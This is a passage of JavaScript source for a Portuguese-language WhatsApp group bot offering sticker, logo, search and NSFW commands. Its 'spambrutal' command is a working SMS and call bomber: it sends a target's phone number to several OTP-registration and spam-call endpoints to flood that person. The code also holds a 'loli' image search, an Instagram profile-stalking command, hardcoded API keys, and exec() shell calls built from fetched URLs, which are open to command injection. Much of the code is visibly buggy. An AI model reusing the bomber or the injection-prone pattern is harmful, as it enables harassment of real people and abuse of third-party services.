                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                buffer = await getBuffer(randKey.result)
                client.sendMessage(from, buffer, video, {mimetype: 'video/mp4', quoted: mek, caption: `${pushname} deu um fatality no @${mentidn.split('@')[0]}`, contextInfo: {mentionedJid: [mentidn]}})
				break
			case 'amor':
                if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Marque a pessoa')
				mentidn = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
                ghost = mek.participant
                const mor =['22','40','45','100','98','99','12','5','0','67','88']
				const am = mor[Math.floor(Math.random() * mor.length)]
				rate = body.slice(1)		
				var kic = `${sender.split("@")[0]}@s.whatsapp.net`		
		     	 reply(`Fazendo probabilidades`)
				 data = fs.readFileSync('./olaf/shit.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                buffer = await getBuffer(randKey.result)               
                amor = `${pushname} suas chances de ficar com @${mentidn.split('@')[0]} são de: ${am}%`
                client.sendMessage(from, buffer, video, {mimetype: 'video/mp4', quoted: mek, caption: amor, contextInfo: {mentionedJid: [mentidn]}})
				break
				case 'shit':
		     	 reply(`${pushname} buscando shit no twt`)
				 data = fs.readFileSync('./olaf/shit.js');
                 jsonData = JSON.parse(data);
                 randIndex = Math.floor(Math.random() * jsonData.length);
                 randKey = jsonData[randIndex];
                buffer = await getBuffer(randKey.result)
                client.sendMessage(from, buffer, video, {mimetype: 'video/mp4', quoted: mek, caption: 'eu ri'})
				break
				case 'modonsfw':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply('Hmmmm')
					if ((args[0]) === 'on') {
						if (isNsfw) return reply('O modo nsfw já está ativo')
						nsfw.push(from)
						fs.writeFileSync('./database/json/nsfw.json', JSON.stringify(nsfw))
						reply(`\`\`\`✓Ativado com sucesso o modo nsfw no grupo\`\`\` *${groupMetadata.subject}*`)
					} else if ((args[0]) === 'off') {
						nsfw.splice(from, 1)
						fs.writeFileSync('./database/json/nsfw.json', JSON.stringify(nsfw))
						reply(`\`\`\`✓Modo nsfw desativado com sucesso no grupo\`\`\` *${groupMetadata.subject}*`)
					} else {
						reply('On para ativar, Off para desligar')
					}
					break
				case 'rtext':
					if (args.length < 1) return reply(mess.blank)
					tels5 = body.slice(7)
					if (tels5.length > 10) return reply('O texto é longo, com até 10 caracteres')
					reply(mess.wait)
					buffer = await getBuffer(`https://api.vhtear.com/romancetext?text=${tels5}&apikey=ANTIGRATISNIHANJENKKK`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: tels5})
					break
				case 'water':
					if (args.length < 1) return reply(mess.blank)
					tels = body.slice(7)
					if (tels.length > 15) return reply('O texto é muito longo, até 20 caracteres')
					reply(mess.wait)
					anu = await fetchJson(`https://zeksapi.herokuapp.com/api/tfire?text=${tels}&apikey=xptnbot352`, {method: 'get'})
					buffer = await getBuffer(anu.result)
					client.sendMessage(from, buffer, image, {quoted: mek})
					break
                 case 'nomegp':
		             if (args.length < 1) return reply ('o nome do grupo é: *${groupMetadata.subject}*')
		             break
				case 'loli2':
					if (!isAnime) return reply('❌ *Deve ativar o modo Anime* ❌')
					anu = await fetchJson(`https://api.vhtear.com/pinterest?query=loli&apikey={BELI APIKEY BIAR WORK DI 0816546638}`, {method: 'get'})
					var lol = JSON.parse(JSON.stringify(anu.result));
					var i2 =  lol[Math.floor(Math.random() * lol.length)];
					nyeee = await getBuffer(i2)
					client.sendMessage(from, nyeee, image, { caption: 'Oni chan baka!!', quoted: mek })
					break
					case 'xd':				
					if (args.length < 1) return reply(mess.wait)
					pinte = body.slice(11)
					anu = await fetchJson(`https://api-zeks.harispoppy.com/api/pin?q=${pin}&apikey=APIKEY`, {method: 'get'})
					reply(mess.wait)
					var pin = JSON.parse(JSON.stringify(anu.result));
					var trest =  pin[Math.floor(Math.random() * pin.length)];
					pineq = await getBuffer(trest)
					client.sendMessage(from, pineq, image, { caption: '*Pinterest*\n\n*Resultado Pesquisa : '+pinte+'*', quoted: mek })
					break
//@olafYT					
				case 'pokemon':
                    client.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.fdci.se/rep.php?gambar=pokemon`, {method: 'get'})
					reply(mess.wait)
					n = JSON.parse(JSON.stringify(data));
					nimek =  n[Math.floor(Math.random() * n.length)];
					pok = await getBuffer(nimek)
					client.sendMessage(from, pok, image, { quoted: mek })
                    await limitAdd(sender)
					break
              case 'circlesticker':
    const pack = arg.split('|')[0]
    const author = arg.split('|')[1]
    if (isMedia && mimetype == 'image/jpeg') {
      await createExif(pack,author)
      await sleep(5000)
      decryptMedia(message).then(mediaData => {
        sharp(mediaData).resize({
          width: 512,
          height: 512,
          fit: sharp.fit.contain,
          background: {
            r: 0,
            g: 0,
            b: 0,
            alpha: 0
          }
        }).webp().toBuffer().then(buffer => {
          modifExif(buffer, id, (res) => {
            mediaData = res.toString('base64')
            sqlter.sendRawWebpAsSticker(from, mediaData)
          })
        })
      })
    } else if (quotedMsg && quotedMsgObj.mimetype == 'image/jpeg') {
      await createExif(pack, author)
      await sleep(5000)
      decryptMedia(quotedMsg).then(mediaData => {
        sharp(mediaData).resize({
          width: 512,
          height: 512,
          fit: sharp.fit.contain,
          background: {
            r: 0,
            g: 0,
            b: 0,
            alpha: 0
          }
        }).webp().toBuffer().then(buffer => {
          modifExif(buffer, id, (res) => {
            mediaData = res.toString('base64')
            client.sendRawWebpAsSticker(from, mediaData)
          })
        })
      })
    } else if (isMedia && mimetype == 'image/gif') {
      const shape = "circle"
      const type = "gif"
      const mediaData = await decryptMedia(message);
      await convertSticker(shape, author, pack, mediaData, type, from).then((res) => client.sendRawWebpAsSticker(from, res.toString("base64")))
    } else if (quotedMsg && quotedMsgObj.mimetype == 'image/gif') {
      const shape = "circle"
      const type = "gif"
      const mediaData = await decryptMedia(quotedMsg);
      await convertSticker(shape, author, pack, mediaData, type, from).then((res) => client.sendRawWebpAsSticker(from, res.toString("base64")))
    } else if (isMedia && mimetype == 'video/mp4') {
      const shape = "circle"
      const type = "mp4"
      const mediaData = await decryptMedia(message);
      await convertSticker(shape, author, pack, mediaData, type, from).then((res) => client.sendRawWebpAsSticker(from, res.toString("base64")))
    } else if (quotedMsg && quotedMsgObj.mimetype == 'video/mp4') {
      const shape = "circle"
      const type = "mp4"
      const mediaData = await decryptMedia(quotedMsg);
      await convertSticker(shape, author, pack, mediaData, type, from).then((res) => client.sendRawWebpAsSticker(from, res.toString("base64")))
    }
    break
    
				case 'semoji':
					if (args.length < 1) return reply('onde está o emojis hum?')
					ranp = getRandom('.png')
					rano = getRandom('.webp')
					teks = body.slice(8).trim()
					anu = await fetchJson(`https://mhankbarbars.tech/api/emoji2png?emoji=${teks}&apikey=${BarBarKey}`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						if (err) return reply(mess.error.stick)
						buffer = fs.readFileSync(rano)
						client.sendMessage(from, buffer, sticker)
						fs.unlinkSync(rano)
					})
					break
				case 'firetext':
					if (args.length < 1) return reply(mess.blank)
					tels = body.slice(7)
					if (tels.ength > 10) return reply('O texto é longo, até 9 caracteres')
					reply(mess.wait)
					anu = await fetchJson(`https://zeksapi.herokuapp.com/api/tlight?text=${tels}&apikey=xptnbot352`, {method: 'get'})
					buff = await getBuffer(anu.result)
					client.sendMessage(from, buff, image, {quoted: mek})
					break
		case 'spambrutal':
                reply('espere um pouco ta?.....')
                                       if (args[0].startsWith('55')) return reply('Use números de prefixo 8/n ex : *8796662*')
                                       if (args[0].startsWith('5577991174304')) return reply('Falha ao ligar para o número do bot')
                                       if (args[0].startsWith('5577991174304')) return reply('Falha, não é possível ligar para o número do proprietário')
                                       var data = body.slice(10)
                                       await fetchJson(`https://core.ktbs.io/v2/user/registration/otp/62`+data, {method: 'get'})
                                       await fetchJson(`https://arugaz.herokuapp.com/api/spamcall?no=`+data, {method: 'get'})
                                       await fetchJson(`https://api.danacita.co.id/users/send_otp/?mobile_phone=62`+data, {method: 'get'})
                                       await fetchJson(`https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP=0`+data, {method: 'get'})
                                       await fetchJson(`https://zeksapi.herokuapp.com/api/spamcall?no=`+data+`&apikey=apivinz`, {method: 'get'})
                                       break
				case 'ytsearch':
					if (args.length < 1) return reply('O que você está procurando?')
					reply(mess.wait)
					anu = await fetchJson(`https://api.arugaz.my.id/api/media/ytsearch?query=${body.slice(10)}`, {method: 'get'})
					if (anu.error) return reply(anu.error)
					teks = '=================\n'
					for (let i of anu.result) {
						teks += `\`\`\`Título\`\`\` : *${i.title}*\n\`\`\`Link\`\`\` : *https://youtu.be/${i.id}*\n\`\`\`Publicados\`\`\` : *${i.uploadDate}*\n\`\`\`Duração\`\`\` : *${i.duration}*\n\`\`\`Visualizadores: \`\`\`*${h2k(i.viewCount)}*\n\`\`\`Canal:\`\`\` *${i.channel.name}*\n=================\n`
					}
					reply(teks.trim())
					await limitAdd(sender) 
					break 
				case 'textolaf':
					if (args.length < 1) return reply(mess.blank)
					tels = body.slice(9)
					if (tels.ength > 10) return reply('O texto é longo, até 9 caracteres')
					reply(mess.wait)
					anu = await fetchJson(`http://melodicxt.herokuapp.com/api/txtcustom?theme=metal_dark_gold&text=${tels}&apiKey=administrator`, {method: 'get'})
					buff = await getBuffer(anu.result)
					client.sendMessage(from, buff, image, {quoted: mek})
					break
				case 'textblue':
					if (args.length < 1) return reply(mess.blank)
					tels = body.slice(9)
					if (tels.ength > 10) return reply('O texto é longo, até 9 caracteres')
					reply(mess.wait)
					anu = await fetchJson(`http://melodicxt.herokuapp.com/api/txtcustom?theme=blue_metal&text=${tels}&apiKey=administrator`, {method: 'get'})
					buff = await getBuffer(anu.result)
					client.sendMessage(from, buff, image, {quoted: mek})
					break
					case 'vipmenu':
					if (!isPremium) return reply('Você não é um Membro Premium, entre em contato com o proprietário ou digite *#daftarvip* para comprar acesso Premium!' ,text, { quoted: mek })
					client.sendMessage(from, vipmenu(prefix) , text, { quoted: mek })
					break
					case 'outros':
					client.sendMessage(from, outros(prefix) , text, { quoted: mek })
					break
					case 'menu2':
					client.sendMessage(from, menu2(prefix) , text, { quoted: mek })
					break
				case 'textsky':
					if (args.length < 1) return reply(mess.blank)
					tels = body.slice(9)
					if (tels.ength > 10) return reply('O texto é longo, até 9 caracteres')
					reply(mess.wait)
					anu = await fetchJson(`https://hujanapi.herokuapp.com/api/sky_online?text=${tels}&apiKey=freetrial`, {method: 'get'})
					buff = await getBuffer(anu.result.result)
					client.sendMessage(from, buff, image, {quoted: mek})
					break
				case 'rize':
					reply(mess.wait)
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=anime+rize`, {method: 'get'})
					ri = JSON.parse(JSON.stringify(anu));
					ze =  ri[Math.floor(Math.random() * ri.length)];
					nye = await getBuffer(ze)
					client.sendMessage(from, nye, image, { caption: 'rize chan!!', quoted: mek })
					await limitAdd(sender) 	
					break 
				case 'mia':
				  	if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
					reply(mess.wait)
					anu = await fetchJson(`https://testesw.herokuapp.com/`, {method: 'get'})
					ri = JSON.parse(JSON.stringify(anu));
					ze =  ri[Math.floor(Math.random() * ri.length)];
					nye = await getBuffer(ze)
					client.sendMessage(from, nye, image, { caption: 'i love you, mia 🥺❤️', quoted: mek })
					await limitAdd(sender) 	
					break
				case 'gcpf3':
					reply(mess.wait)
					anu = await fetchJson(`https://api-textcpf.herokuapp.com/`, {method: 'get'})
					ri = JSON.parse(JSON.stringify(anu));
					ze =  ri[Math.floor(Math.random() * ri.length)];
					nye = await getBuffer(ze)
					client.sendMessage(from, nye, image, {quoted: mek, caption: mess.success})
					await limitAdd(sender) 	
					break 
				case 'texteng':
					if (args.length < 1) return reply(mess.blank)
					tels = body.slice(9)
					if (tels.ength > 10) return reply('O texto é longo, até 9 caracteres')
					reply(mess.wait)
					anu = await fetchJson(`http://melodicxt.herokuapp.com/api/txtcustom?theme=sand_engraved&text=${tels}&apiKey=administrator`, {method: 'get'})
					buff = await getBuffer(anu.result)
					client.sendMessage(from, buff, image, {quoted: mek})
					break
				case 'emojih':
				anu = await fetchJson(`https://docs-jojo.herokuapp.com/api/emoji2png?emoji=${args[0]}&type=aple`, {method: 'get'})
				jes = await getBuffer(anu)
				client.sendMessage(from, jes, image,{quoted : mek, caption : 'DONE'})
				break
				case 'igstalkear':
                     hmm = await fetchJson(`https://freerestapi.herokuapp.com/api/v1/igs?u=${body.slice(9)}`)
                     buffer = await getBuffer(hmm.data.profilehd)
                     hasil = `Fullname : ${hmm.data.fullname}\npengikut : ${hmm.data.follower}\nMengikuti : ${hmm.data.following}\nPrivate : ${hmm.data.private}\nVerified : ${hmm.data.verified}\nbio : ${hmm.data.bio}`
                    client.sendMessage(from, buffer, image, {quoted: mek, caption: hasil})
                    await limitAdd(sender)
					break 
                case 'wolflogo':
                      if (args.length < 1) return reply('Cadê o texto?')
                      gh = body.slice(9)
                      gl1 = gh.split("|")[0];
                      gl2 = gh.split("|")[1];
                      reply(mess.wait)
                      anu = await fetchJson(`https://tobz-api.herokuapp.com/api/textpro?theme=wolflogo1&text1=${gl1}&text2=${gl2}`, {method: 'get'})
                      buff = await getBuffer(anu.result)
                      client.sendMessage(from, buff, image, {quoted: mek})
                      break
		case 'dadu':
			ranp = getRandom('.png')
			rano = getRandom('.webp')
		        random = `${Math.floor(Math.random() * 6)}`
                    hasil = 'https://www.random.org/dice/dice' + random + '.png'
			exec(`wget ${hasil} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			fs.unlinkSync(ranp)
			if (err) return reply(mess.error.stick)
			buffer = fs.readFileSync(rano)
			client.sendMessage(from, buffer, sticker, {quoted: mek})
			fs.unlinkSync(rano)
			})
			break
			case 'wasted':
                        var imgbb = require('imgbb-uploader')
                        if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                                         ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
                                         reply(ind.wait)
                                         owgi = await  client.downloadAndSaveMediaMessage(ger)
                                         anu = await imgbb("727e7e43f6cda1dfb85d888522fd4ce1", owgi)
                                        teks = `${anu.display_url}`
                                        ranp = getRandom('.png')
                                        rano = getRandom('.webp')
                                        anu1 = `https://some-random-api.ml/canvas/wasted?avatar=${teks}`
                                         exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
                                                fs.unlinkSync(ranp)
                                                if (err) return reply(ind.error.stick)
                                                nobg = fs.readFileSync(rano)
                                                 client.sendMessage(from, nobg, sticker, {quoted: mek})
                                                fs.unlinkSync(rano)
                                        })
                                    
                                             } else {
                                                 reply('Gunakan foto!')
                                          }
                                          await limitAdd(sender) 
                                          break  
                case 'lionlogo':
                      if (args.length < 1) return reply('Cadê o texto?')
                      gh = body.slice(9)
                      gl1 = gh.split("|")[0];
                      gl2 = gh.split("|")[1];
                      reply(mess.wait)
                      anu = await fetchJson(`https://tobz-api.herokuapp.com/api/textpro?theme=lionlogo&text1=${gl1}&text2=${gl2}`, {method: 'get'})
                      buff = await getBuffer(anu.result)
                      client.sendMessage(from, buff, image, {quoted: mek})
                      break
				case 'c3d':
					if (args.length < 1) return reply(mess.blank)
					dimen = body.slice(5)
					reply(mess.wait)
					tigaa = await getBuffer(`https://api-anoncybfakeplayer.herokuapp.com/textpro/3dgradientstext?text=${dimen}`)
					itsmeiky.sendMessage(from, tigaa, image, {caption: 'Nih kak', quoted: shizuka})
					await limitAdd(sender) 
					break                    
				case 'testetxt':
				case 'tst':
					if (args.length < 1) return reply('O que você quer escrever??') 
					teks = body.slice(7)
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://litheade.sirv.com/296c784ea885c846beaa0a66fd646448.jpg?text.0.text=${teks}`, {method: 'get'})
					client.sendMessage(from, buff, image, {quoted: mek, caption: mess.success})
                    await limitAdd(sender)
					break
//logo
//minhas apis	
// 1- CASES DE LOGO BY: OLAF YT
// 2- logo apis: Olaf YT
// 3- google implemente o parametro text, para um foto
//com o texto escolhido na aba search.
//4- text parametro monta uma foto template simples
//do jogo pubg


               case 'gglogo':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 15) return reply('O texto é longo, até 15 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://clutamac.sirv.com/darkbots-api-bot-2021/gg2.jpeg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.x=-12%25&text.0.position.y=44%25&text.0.size=11&text.0.color=130e0e`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
					break
case 'Olaft':
   dark = `${body.slice(6)}`
   teks = dark.split("/")[0];
   tek = dark.split("/")[1];
    anu = await fetchJson(`https://darkzinhoapi2021dark.herokuapp.com/api/glitch?&text=${teks}&text2=${tek}`)
    buffer = await getBuffer(anu.resultado)
    client.sendMessage(from, buffer, image, {quoted: mek})
    break
				case 'buscas':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply('Hmmmm')
					if ((args[0]) === 'on') {
						if (isBuscas) return reply('O modo buscas já está ativo')
						buscas.push(from)
						fs.writeFileSync('./database/json/buscas.json', JSON.stringify(buscas))
						reply(`\`\`\`✓Ativado com sucesso o modo buscas no grupo\`\`\` *${groupMetadata.subject}*`)
					} else if ((args[0]) === 'off') {
						buscas.splice(from, 1)
						fs.writeFileSync('./database/json/buscas.json', JSON.stringify(buscas))
						reply(`\`\`\`✓Modo buscas desativado com sucesso no grupo\`\`\` *${groupMetadata.subject}*`)
					} else {
						reply('On para ativar, Off para desligar')
					}
					break
               case 'tel':
                    if (!isBuscas) return reply('*Modo buscas destivado nesse grupo, use .buscas on, para ativar e .buscas off, para desativar* 📍')
                    if (!isGroup) return reply(mess.only.group)
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 10) return reply('Numero invalido! digite um número com 9 digitos.')
					reply('*Syne⁩ o amigao aqui ta querendo puxar dados.*')
					teks = `Ou chame algum adm. *${groupMetadata.subject}*: ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)			
					break
					//google implemente o parametro text, para um foto
                                        //com o texto escolhido na aba search.
             case 'pub':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 15) return reply('O texto é longo, até 15 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://clutamac.sirv.com/darkbots-api-bot-2021/pubg.png?profile=Example&text.0.text=${teks}&text.0.size=52&text.0.outline.color=0050ff&text.0.outline.blur=100&text.1.text=${teks}&text.1.size=51&text.1.background.color=002fff&text.1.outline.color=005cff&text.1.outline.blur=100`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
					break
					//text parametro monta uma foto template simples
                                        //do jogo pubg				
                case 'pslogo':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 15) return reply('O texto é longo, até 15 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://nturshro.sirv.com/Api-dark/20210222_035224.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.y=26%25&text.0.size=23&text.0.color=000000&text.0.font.family=Playfair%20Display%20SC&text.0.font.weight=600&text.0.font.style=italic&text.0.background.opacity=5`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
					break
case 'gtlogo':		
try {
					teks = body.slice(10)
					te = teks.split("/")[0];
					ks = teks.split("/")[1];
					if (teks.length > 300) return reply('O texto é longo, até 30 caracteres')
					gtlog = await fetchJson(`https://darkzinhoapi2021dark.herokuapp.com/api/glitch?text=${te}&text2=${ks}`)
ggtlogo = await getBuffer(gtlog.resultado)
const txxs = `${teks}`
					client.sendMessage(from, bufferz, image, {quoted: mek, caption: txxs})
} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply(`Error testando comando: ${e}`)
					}
break
                case 'dulis3':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 300) return reply('O texto é longo, até 30 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					dark = await getBuffer(`https://ferdiz-api.herokuapp.com/api/nulis?kata=${teks}`)
					darko = await getBuffer(dark.result)
					client.sendMessage(from, darko, image, {quoted: mek})
					break
                case 'dulis2':
                    teks = body.slice(7)
                    data = await fetchJson(`https://ferdiz-api.herokuapp.com/api/nulis?kata=${teks}`)
                    anuk = await getBuffer(data.result)
                    dark = `Codado por: Olaf 😏`
					client.sendMessage(from, anuk, image, {quoted: mek, caption: dark})
                    await limitAdd(sender)
                    break
					case 'cpubg':
					case 'pubg':
					if (args.length < 1) return reply('Teksnya mana njer??')
				 	if (args.length > 10) return reply('karakter minimal 10')
					cpubg = `${body.slice(7)}`
					cpubg1 = cpubg.split("/")[0];
					cpubg2 = cpubg.split("/")[1];
					anu = await fetchJson(`https://tobz-api.herokuapp.com/api/photooxy?theme=pubg&text1=${cpubg1}&text2=${cpubg2}&apikey=${TobzKey}`, {method: 'get'})
					cpubg = await getBuffer(anu.result)
					client.sendMessage(from, cpubg, image, {quoted: mek})
					await limitAdd(sender) 
					break  
		case 'tpfig':
					if (args.length < 1) return reply(ind.wrongf())
					teks = body.slice(5)
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					darko = await getBuffer(`https://api.vhtear.com/textxgif?text=${teks}&apikey=c1d162b46e634f389efa1ac715f03d03`)
					client.sendMessage(from, darko, sticker, {quoted: mek})
					await limitAdd(sender) 
					break
		case 'indenifiidohwknsks':
					darko = await getBuffer(`https://media.tenor.com/images/bca4fc6cb83cd3f49ee49ec7ea60b980/tenor.gif`)
					client.sendMessage(from, darko, sticker, {quoted: mek})
					await limitAdd(sender) 
					break
				case 'mifig':
					cry = getRandom('.gif')
						darko = await getBuffer(`https://media.tenor.com/images/bca4fc6cb83cd3f49ee49ec7ea60b980/tenor.gif`)
						darko = fs.readFileSync(cry)
					    client.sendMessage(from, darko, sticker, {quoted: mek})
					  	await limitAdd(sender) 
					break 
		    case 'indefinidotemporiamente':
			    higorzin = `${body.slice(7)}`
			    hi = dark.split("/")[0];
			    gor = dark.split("/")[1];
			    zin = dark.split("/")[2];
			    reply('*Estou fazendo, se der erro tente novamente ✓*')
			    buffer = await getBuffer(`https://clutamac.sirv.com/images%20-%202021-03-01T221944.000.jpeg?text.0.text=${hi}&text.0.position.gravity=center&text.0.size=32&text.0.color=003eff&text.0.font.family=PT%20Sans%20Caption&text.0.background.opacity=37&text.1.text=${gor}&text.1.position.gravity=center&text.1.position.x=1%25&text.1.size=32&text.1.color=ff0000&text.1.font.family=PT%20Sans%20Caption&text.1.outline.blur=34&text.1.outline.opacity=10&text.2.text=${zin}&text.2.position.gravity=northwest&text.2.position.x=34%25&text.2.position.y=40%25&text.2.size=33&text.2.color=ffffff&text.2.font.family=PT%20Sans%20Caption`, {method: 'get'})
			    client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
			    await limitAdd(sender) 
			    break  
                case 'bitext':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 15) return reply('O texto é longo, até 15 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://clutamac.sirv.com/images%20-%202021-03-01T221944.000.jpeg?text.0.text=${teks}&text.0.position.gravity=center&text.0.size=32&text.0.color=003eff&text.0.font.family=PT%20Sans%20Caption&text.0.background.opacity=37&text.1.text=${teks}&text.1.position.gravity=center&text.1.position.x=1%25&text.1.size=32&text.1.color=ff0000&text.1.font.family=PT%20Sans%20Caption&text.1.outline.blur=34&text.1.outline.opacity=10&text.2.text=${teks}&text.2.position.gravity=northwest&text.2.position.x=34%25&text.2.position.y=40%25&text.2.size=33&text.2.color=ffffff&text.2.font.family=PT%20Sans%20Caption`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
					break
                case 'chlogo':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 8) return reply('O texto é longo, até 8 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://clutamac.sirv.com/IMG_20210303_050439.jpg?text.0.text=${teks}&text.0.position.gravity=north&text.0.position.x=37%25&text.0.position.y=67%25&text.0.size=17&text.0.color=282222`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
					break
                case 'plogo':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 15) return reply('O texto é longo, até 15 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://clutamac.sirv.com/1011b781-bab1-49e3-89db-ee2c064868fa%20(1).jpg?text.0.text=${teks}&text.0.position.gravity=northwest&text.0.position.x=22%25&text.0.position.y=60%25&text.0.size=18&text.0.color=000000&text.0.opacity=47&text.0.font.family=Roboto%20Mono&text.0.font.style=italic`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
					break
			    case 'plogo2':
			    plogo = `${body.slice(7)}`
			    plo = plogo.split("/")[0];
			    go = plogo.split("/")[1];
			    reply('*Estou fazendo, se der erro tente novamente ✓*')
			    buffer = await getBuffer(`https://clutamac.sirv.com/1011b781-bab1-49e3-89db-ee2c064868fa%20(1).jpg?text.0.text=${plo}&text.0.position.gravity=northwest&text.0.position.x=22%25&text.0.position.y=60%25&text.0.size=${go}&text.0.color=000000&text.0.opacity=47&text.0.font.family=Roboto%20Mono&text.0.font.style=italic`, {method: 'get'})
			    client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
			    await limitAdd(sender) 
			    break
			    case 'pblog':
			    plogo = `${body.slice(7)}`
			    plo = plogo.split("/")[0];
			    go = plogo.split("/")[1];
			    reply('*Estou fazendo, se der erro tente novamente ✓*')
			    buffer = await getBuffer(`https://ferdiz-api.herokuapp.com/api/pubg?text=${plo}&text2=${go}`, {method: 'get'})
                bufferz = await getBuffer(buffer.result)
				client.sendMessage(from, bufferz, image, {quoted: mek})
					break
		case 'pblog2':
               plogo = `${body.slice(7)}`
			    plo = plogo.split("/")[0];
			    go = plogo.split("/")[1];
					teks = body.slice(7)
					anu = await getBuffer(`https://ferdiz-api.herokuapp.com/api/pubg?text=${plo}&text2=${go}`)
					buff = await getBuffer(anu.result)
					client.sendMessage(from, buff, image, {quoted: mek})
					await limitAdd(sender)
					break
                case 'canal':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 10) return reply('O texto é longo, até 10 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://nturshro.sirv.com/Api-dark/20210226_190234.jpg?text.0.text=${teks}&text.0.position.gravity=northwest&text.0.position.x=26%25&text.0.position.y=49%25&text.0.size=14&text.0.color=000000&text.0.font.family=Poppins`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*PRONTINHO ✓*\n\n*DONO CASE:* OLAF'})
					break
                case 'jjkk':
					if (args.length < 1) return reply(mess.blank)
					a = body.slice(10)
					if (teks.length > 15) return reply('O texto é longo, até 15 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await fetchJson(`https://api.ritekit.com/v2/image/extract-image?url=${teks}&client_id=52ad7438afd2baa8779f9266a8a997cd92771f1eb625`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*FOTO DO LINK: ${a} ✓*'})
					break
                case 'emp':
					if (args.length < 1) return reply(mess.blank)
					teks = body.slice(7)
					if (teks.length > 400) return reply('O url é longo, até 400 caracteres')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://api.ritekit.com/v2/image/extract-image?url=${teks}&client_id=52ad7438afd2baa8779f9266a8a997cd92771f1eb625`)
					client.sendMessage(from, buffer, image, {quoted: mek, caption: '*IMAGEM DO SITE: ${teks} ✓*'})
					break
                case 'comunis':
				    client.updatePresence(from, Presence.composing)
				if (!isGroup) return reply(mess.only.group)
					try {
					ppimg = await client.getProfilePicture(from)
				} catch {
					ppimg = 'https://i.ibb.co/NthF8ds/IMG-20201223-WA0740.jpg'
				}
                    if (args.length < 1) return reply('marque seus amigos!')
					reply('*Estou fazendo, se der erro tente novamente ✓*')
					buffer = await getBuffer(`https://api.alexflipnote.dev/filter/communist?image=${ppimg}`)
